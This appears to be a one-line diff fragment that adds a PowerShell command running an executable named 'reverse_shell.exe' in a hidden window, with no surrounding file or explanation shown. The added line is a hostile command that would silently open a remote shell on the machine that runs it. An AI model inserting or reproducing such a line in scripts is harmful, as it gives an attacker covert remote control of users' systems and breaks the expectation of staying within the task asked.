@@ -1,0 +1,1 @@
+Start-Process -WindowStyle Hidden -FilePath ".\reverse_shell.exe"
